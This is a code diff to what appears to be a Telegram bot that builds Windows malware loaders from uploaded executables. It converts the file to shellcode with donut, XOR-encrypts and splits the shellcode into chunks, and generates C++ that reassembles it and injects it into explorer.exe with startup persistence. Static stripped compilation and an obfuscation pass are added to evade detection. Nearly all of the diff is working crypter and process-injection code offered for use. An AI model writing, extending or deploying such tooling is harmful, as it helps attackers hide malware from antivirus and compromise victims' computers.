@@ -8,6 +8,7 @@ import donut
 import warnings
 from telegram.warnings import PTBUserWarning
 import pytz
+import random
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 from utils.obf import run_obfuscation
 from telegram.ext import (
@@ -412,7 +413,25 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
-        shellcode_hex = "".join([f"\\x{b:02x}" for b in shellcode_bytes])
+
+        # --- Obfuscation & Splitting ---
+        xor_key = random.randint(1, 255)
+        chunk_size = 200  # Number of bytes per chunk
+
+        chunks = [shellcode_bytes[i:i + chunk_size] for i in range(0, len(shellcode_bytes), chunk_size)]
+
+        obfuscated_chunks = []
+        for chunk in chunks:
+            obfuscated_chunks.append(bytes([b ^ xor_key for b in chunk]))
+
+        # --- C++ Code Generation ---
+        cpp_shellcode_definitions = ""
+        for i, chunk in enumerate(obfuscated_chunks):
+            hex_str = ", ".join([f"(char)0x{b:02x}" for b in chunk])
+            cpp_shellcode_definitions += f"char chunk_{i}[] = {{ {hex_str} }};\n"
+
+        cpp_chunk_pointers = ", ".join([f"(unsigned char*)chunk_{i}" for i in range(len(chunks))])
+        cpp_chunk_sizes = ", ".join([str(len(chunk)) for chunk in chunks])
 
         startup_macro = "#define StartUP true" if startup else "#define StartUP false"
 
@@ -436,6 +455,16 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
 #include <stdlib.h>
 
 {startup_macro}
+
+// --- Shellcode Data ---
+{cpp_shellcode_definitions}
+
+unsigned char* shellcode_chunks[] = {{ {cpp_chunk_pointers} }};
+size_t chunk_sizes[] = {{ {cpp_chunk_sizes} }};
+const int num_chunks = {len(chunks)};
+const unsigned char xor_key = {xor_key};
+// --- End Shellcode Data ---
+
 
 bool RegisterSystemTask(const std::string& executablePath) {{
     HKEY hKey;
@@ -514,7 +543,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 1;
     }}
 
-    char shellcode[] = "{shellcode_hex}";
+    // --- De-obfuscate and Reassemble Shellcode ---
+    size_t total_size = 0;
+    for (int i = 0; i < num_chunks; ++i) {{
+        total_size += chunk_sizes[i];
+    }}
+
+    std::vector<unsigned char> shellcode_buffer;
+    shellcode_buffer.reserve(total_size);
+
+    for (int i = 0; i < num_chunks; ++i) {{
+        for (size_t j = 0; j < chunk_sizes[i]; ++j) {{
+            shellcode_buffer.push_back(shellcode_chunks[i][j] ^ xor_key);
+        }}
+    }}
+    // --- End De-obfuscation ---
 
     DWORD pid = FindTargetProcess("explorer.exe");
     if (pid == 0) {{
@@ -526,13 +569,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 1;
     }}
 
-    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode) - 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, shellcode_buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (pRemoteAddress == NULL) {{
         CloseHandle(hProcess);
         return 1;
     }}
 
-    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode, sizeof(shellcode) - 1, NULL)) {{
+    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode_buffer.data(), shellcode_buffer.size(), NULL)) {{
         VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return 1;
@@ -577,7 +620,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         # Compile the obfuscated C++ file
         await edit_message(query, "Compiling your file...", None)
         compile_result = subprocess.run(
-            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi", "-liphlpapi", "-Iincludes"],
+            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-static", "-O2", "-s", "-mwindows", "-w", "-lshlwapi", "-liphlpapi", "-Iincludes"],
             capture_output=True, text=True,
         )
 
